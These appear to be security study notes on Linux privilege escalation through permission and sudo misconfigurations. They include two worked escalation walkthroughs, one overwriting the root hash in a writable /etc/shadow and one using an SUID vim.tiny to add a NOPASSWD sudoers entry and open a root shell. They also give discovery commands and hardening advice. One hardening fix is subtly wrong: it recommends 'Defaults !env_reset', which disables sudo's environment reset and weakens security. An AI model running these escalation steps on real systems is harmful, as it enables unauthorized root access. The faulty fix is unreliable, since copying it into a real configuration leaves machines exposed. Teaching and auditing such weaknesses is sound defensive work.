

> [!abstract] Linux Privilege Escalation: Misconfigurations & Sudo
> Misconfiguration of file permissions or `sudo` policies in Linux occurs when inappropriate or overly permissive access rights are assigned. This can expose sensitive information or allow unauthorized actions, leading to full system compromise.
> **MITRE ATT&CK Mapping:** [T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/) | [T1548.003 - Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/)

## File Permission Misconfigurations

> [!info] Identifying Misconfigurations
> Proper permission management is crucial. Attackers constantly scan for files that are world-writable or have SUID/SGID bits set unnecessarily.
> 
> **Common Discovery Commands:**
> ```bash
> # 1. Check permissions of specific files
> ls -l /etc/passwd /etc/shadow
> 
> # 2. Search for World-Writable files (excluding symlinks)
> find / -not -type l -perm -o+w 2>/dev/null
> 
> # 3. Search for SUID or SGID files
> find / -type f -perm /4000 -o -perm /2000 2>/dev/null
> find / -type f -perm -u=s 2>/dev/null
> ```

> [!example]+ Reference: Proper Linux Permissions
> | File/Directory | Recommended Permission | Description |
> | :--- | :--- | :--- |
> | `/etc/passwd` | `644` | Readable by all, writable only by root. |
> | `/etc/shadow` | `600` | Accessible only by root. |
> | User home dirs | `700` | Accessible only by the user. |
> | Web server root | `755` | Readable/executable by all, writable by owner only. |

---

## Exploit Scenario 1: World-Writable `/etc/shadow`

> [!danger]+ Escalation via Writable Shadow File
> If `/etc/shadow` is world-writable (e.g., `-rw-rw-rw-`), any user can modify the root password hash.
> 
> **Step 1: Generate a new password hash**
> ```bash
> openssl passwd -1 -salt abc password
> # Output: $1$abc$BXBqpb9BZcZhXLgbee.0s/
> ```
> 
> **Step 2: Modify** `/etc/shadow`
> Replace the root user's `*` (or existing hash) with your newly generated hash.
> ```text
> # Original
> root:*:20033:0:99999:7:::
> 
> # Modified
> root:$1$abc$BXBqpb9BZcZhXLgbee.0s/:20033:0:99999:7:::
> ```
> 
> **Step 3: Switch to root**
> ```bash
> su root
> # Enter password: password
> ```

---

## Exploit Scenario 2: SUID/SGID Misuse

> [!bug+] Escalation via SUID Binary (e.g., `vim.tiny`)
> If a binary like `vim.tiny` has the SUID bit set (`-rwsr-xr-x root root`), it runs as root. Attackers can use its shell escape or file editing capabilities to modify system configs.
> 
> **Step 1: Identify the SUID binary**
> ```bash
> find / -type f -perm -u=s 2>/dev/null
> # Output: -rwsr-xr-x 1 root root 123456 Nov 19 10:00 /usr/bin/vim.tiny
> ```
> 
> **Step 2: Modify `/etc/sudoers`**
> Open the sudoers file using the SUID binary:
> ```bash
> /usr/bin/vim.tiny /etc/sudoers
> ```
> Add your current user to the file with `NOPASSWD`:
> ```text
> # User privilege specification
> root    ALL=(ALL:ALL) ALL
> 
> # Allow members of group sudo to execute any command
> %sudo   ALL=(ALL:ALL) ALL
> CurrentUser  ALL=NOPASSWD:ALL
> ```
> Save and quit (`:wq!`).
> 
> **Step 3: Escalate to root**
> ```bash
> sudo /bin/bash
> whoami # Output: root
> ```

---

## Sudo Misconfigurations

> [!warning] Exploiting `/etc/sudoers` Policies
> The `sudo` command allows users to execute commands with elevated privileges. Misconfigurations in `/etc/sudoers` can result in unintended access. Always check `sudo -l` first.
> **Resource:** [GTFOBins](https://gtfobins.github.io/)

> [!tip] 1. ALL Privileges for Specific Users
> - **Config:** `user1 ALL=(ALL) NOPASSWD: ALL`
> - **Issue:** Grants unrestricted access without a password. Immediate root shell if compromised.
> - **Fix:** `user1 ALL=(ALL) NOPASSWD: /path/to/specific_command`

> [!tip] 2. Wildcards in Command Definitions
> - **Config:** `user1 ALL=(ALL) NOPASSWD: /path/to/*command`
> - **Issue:** Attackers can create a malicious executable named `mycommand` in that directory and run it as root.
> - **Fix:** Avoid wildcards entirely. Use absolute paths for specific binaries.

> [!tip] 3. Misconfigured Environment Variables
> - **Config:** `Defaults env_keep += "LD_PRELOAD"`
> - **Issue:** Allows untrusted environment variables (like `LD_PRELOAD`) to inject malicious shared libraries into privileged commands.
> - **Fix:** Restrict environment variables and use a secure path:
>   ```text
>   Defaults secure_path="/usr/bin:/bin:/usr/sbin:/sbin"
>   Defaults !env_reset
>   ```

> [!tip] 4. Overuse of `NOPASSWD`
> - **Config:** `%admin ALL=(ALL) NOPASSWD: ALL`
> - **Issue:** Removing the password requirement drastically increases risk if the session is left open or hijacked.
> - **Fix:** Use `NOPASSWD` sparingly, only for automated scripts or specific maintenance tasks.

> [!tip] 5. Allowing Execution on Sensitive Files
> - **Config:** `user1 ALL=(ALL) NOPASSWD: /bin/cat /etc/shadow`
> - **Issue:** Allows direct access to sensitive files. A user could read hashes or overwrite critical configurations.
> - **Fix:** Disallow direct access to sensitive files.

> [!tip] 6. Incorrect File Permissions on Sudoers
> - **Issue:** If `/etc/sudoers` or `/etc/sudoers.d/` are writable by unauthorized users, they can edit them to escalate privileges.
> - **Fix:** Ensure correct permissions:
>   ```bash
>   chmod 440 /etc/sudoers
>   chmod 440 /etc/sudoers.d/*
>   chown root:root /etc/sudoers /etc/sudoers.d/*
>   ```

> [!tip] 7. Using Aliases or Shell Escapes
> - **Issue:** If a user has `sudo` access to interactive programs (e.g., `vi`, `less`, `find`, `awk`), they can use shell escapes to spawn a root shell.
> - **Fix:** Restrict access to commands with shell escape capabilities.

---

> [!success] Preventive Measures
> 1. **Audit Regularly:** Use `sudo -l` to list allowed commands for each user.
> 2. **Log Activity:** Enable logging in `sudoers`: `Defaults logfile="/var/log/sudo.log"`
> 3. **Principle of Least Privilege:** Grant only the required permissions for specific tasks.
> 4. **Use SELinux/AppArmor:** Add an additional layer of security to restrict unauthorized actions.

